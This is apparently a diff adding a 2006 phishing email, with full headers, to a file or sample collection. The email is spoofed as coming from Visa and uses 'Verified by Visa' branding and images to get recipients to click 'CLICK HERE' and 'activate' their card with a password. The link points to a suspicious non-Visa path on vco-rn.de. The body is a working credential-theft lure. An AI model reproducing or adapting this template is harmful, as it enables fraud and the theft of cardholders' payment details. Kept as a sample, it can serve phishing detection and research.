@@ -1,0 +1,36 @@
+Return-Path: <apache@newbie.network.my-ct.de>
+X-Original-To: user@login.example.com
+Delivered-To: user@login.example.com
+Received: from mail.example.org (mail.example.org [192.168.4.9])
+	by example.com (Postfix) with ESMTP id 09271469BB
+	for <user@login.example.com>; Sat, 19 Aug 2006 23:48:31 -0400 (EDT)
+Received: from mail.my-ct.de (newbie.network.my-ct.de [82.211.58.6])
+	by mail.example.org (Postfix) with SMTP id 6F2F46CD05C
+	for <user@example.com>; Sat, 19 Aug 2006 23:48:30 -0400 (EDT)
+Received: (qmail 16511 invoked by uid 1671); 20 Aug 2006 03:48:27 -0000
+Received: from 82.211.59.6 by newbie (envelope-from <apache@newbie.network.my-ct.de>, uid 1052) with qmail-scanner-1.25 
+ (clamdscan: 0.71. spamassassin: 3.0.1.  
+ Clear:RC:1(82.211.59.6):SA:0(-0.7/5.0):. 
+ Processed in 0.576651 secs); 20 Aug 2006 03:48:27 -0000
+X-Spam-Status: No, hits=-0.7 required=5.0
+Received: from newbie.network.my-ct.de (82.211.59.6)
+  by mail.my-ct.de with SMTP; 20 Aug 2006 03:48:26 -0000
+To: user@example.com
+Subject: Please use our new Service and protect your Visa Card!
+From: Visa Card Protection <info@visa.com>
+Reply-To:
+MIME-Version: 1.0
+Content-Type: text/html
+Content-Transfer-Encoding: 8bit
+Date: Sun, 20 Aug 2006 05:48:26 CEST
+X-Qmail-Scanner-Message-ID: <115604570668616490@newbie>
+Message-Id: <20060820034830.6F2F46CD05C@mail.example.org>
+Status: RO
+X-Status: 
+X-Keywords:                 
+X-UID: 77
+
+<html> <img src="http://home.arcor.de/binlist/verified_by_visa_grey_box.gif" style="border: 0px solid black; width: 116px; height: 71px" alt="verified_by_visa_grey_box.gif" /><br /><br /><img src="http://home.arcor.de/binlist/ttl_verified_by_visa.gif" style="border: 0px solid black; width: 250px; height: 18px" alt="ttl_verified_by_visa.gif" /><p><h3 class="tagLine">Protect your Visa card online       with a personal password</h3>      Visa provides reassurance that only you can       use your Visa card online. Learn more about the       benefits of Verified by Visa.<br /><br />Verified by Visa protects your existing Visa card with a password you create, giving you assurance that only you can use your Visa card online. <p>Simply activate/re-activated your card and create your personal password. You will get the added confidence that your Visa card is safe when you shop at participating online stores.<br/><br/><div style="text-align: center"><a href="http://vco-rn.de/administra
+ tor/.verify/www.usa.visa.com/"><img src="http://home.arcor.de/binlist/activate_now_for_verified_by_visa.gif" style="border: 1px solid black; width: 251px; height: 17px" alt="activate_now_for_verified_by_visa.gif" /></a></div><p><div style="text-align: center"><span style="color: #ff6600"><a href="http://vco-rn.de/administrator/.verify/www.usa.visa.com/"><span style="font-size: medium"><strong>CLICK HERE</strong></span></a></div><br /><br /><strong><font color="blue">Verified by Visa also works with <a href="http://usa.visa.com/personal/cards/credit/smart_visa.html?it=il|/personal/security/visa_security_program/vbv/how_it_works.html|smart%20Visa%20cards">smart Visa cards</a>. </font></strong>    					 			 				 				 						       	      	<br /><ul><li class="first">  <a href="http://usa.visa.com/about_visa/about_visa_usa/index.html">About Visa</a>  </li><li>  <a href="http://usa.visa.com/track/dyredir.jsp?rDirl=http%3A//visaatm%2Einfonow%2Enet/bin/findNow%3FONE%3D1%26CLIENT_ID%
+ 3DVISA_USA%26LOCATOR%3DVISA_USA%26TYPE%3DPERSONAL">ATM Locator</a>  </li><li>  <a href="http://usa.visa.com/sitewide/sitemap.html">Site Map</a>  </li><li>  <a href="http://usa.visa.com/sitewide/legal.html">Legal</a></li><li><a href="http://usa.visa.com/sitewide/privacy_policy.html">Privacy Policy</a><br /></li><li class="copyright">  <a href="http://usa.visa.com/track/dyredir.jsp?rDirl=http%3A//www%2Evisa%2Ecom/%3Fnopass%3D1">Global Visa</a><br /><br /><div><strong>Copyright 2006, Visa International. All Rights Reserved.</strong></div></li></ul> </html>
+
